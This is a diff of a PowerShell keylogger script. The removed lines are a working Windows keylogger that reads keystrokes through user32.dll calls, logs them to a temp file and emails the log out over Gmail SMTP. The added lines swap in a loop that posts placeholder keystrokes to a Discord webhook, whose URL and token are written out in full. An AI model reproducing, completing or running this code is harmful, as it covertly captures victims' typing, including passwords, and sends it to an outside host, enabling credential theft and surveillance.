@@ -1,74 +1,36 @@
-# gmail credentials
-$email = "example@gmail.com"
-$password = "password"
+# Define Discord webhook URL
+$discordWebhookUrl = "https://discord.com/api/webhooks/1243928007182385182/SCzOW4wzwv6jNNPR45QctapEh1kTGVKqSDBrxn7gAR0J4K-pXfbE1IIbW9VrsfVXL6T6"
 
-# keylogger
-function KeyLogger($logFile="$env:temp/$env:UserName.log") {
+# Define function to send message via Discord webhook
+function Send-DiscordMessage {
+    param (
+        [string]$Content
+    )
 
-  # email process
-  $logs = Get-Content "$logFile"
-  $subject = "$env:UserName logs"
-  $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
-  $smtp.EnableSSL = $true
-  $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
-  $smtp.Send($email, $email, $subject, $logs);
+    try {
+        $body = @{
+            content = $Content
+        } | ConvertTo-Json
 
-  # generate log file
-  $generateLog = New-Item -Path $logFile -ItemType File -Force
-
-  # API signatures
-  $APIsignatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
-public static extern short GetAsyncKeyState(int virtualKeyCode);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-'@
-
- # set up API
- $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
-
-  # attempt to log keystrokes
-  try {
-    while ($true) {
-      Start-Sleep -Milliseconds 40
-
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
-
-        # use API to get key state
-        $keystate = $API::GetAsyncKeyState($ascii)
-
-        # use API to detect keystroke
-        if ($keystate -eq -32767) {
-          $null = [console]::CapsLock
-
-          # map virtual key
-          $mapKey = $API::MapVirtualKey($ascii, 3)
-
-          # create a stringbuilder
-          $keyboardState = New-Object Byte[] 256
-          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
-          $loggedchar = New-Object -TypeName System.Text.StringBuilder
-
-          # translate virtual key
-          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
-            # add logged key to file
-            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
-          }
-        }
-      }
+        Invoke-WebRequest -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
     }
-  }
-
-  # send logs if code fails
-  finally {
-    # send email
-    $smtp.Send($email, $email, $subject, $logs);
-  }
+    catch {
+        Write-Host "Error occurred: $_"
+    }
 }
 
-# run keylogger
+# Define function to log keystrokes and send via Discord webhook
+function KeyLogger {
+    while ($true) {
+        Start-Sleep -Seconds 10  # Adjust sleep time as needed
+
+        # Get keystrokes here (replace this with your keylogging logic)
+        $keystrokes = "Mock keystrokes"
+
+        # Send keystrokes via Discord webhook
+        Send-DiscordMessage -Content $keystrokes
+    }
+}
+
+# Run keylogger function
 KeyLogger
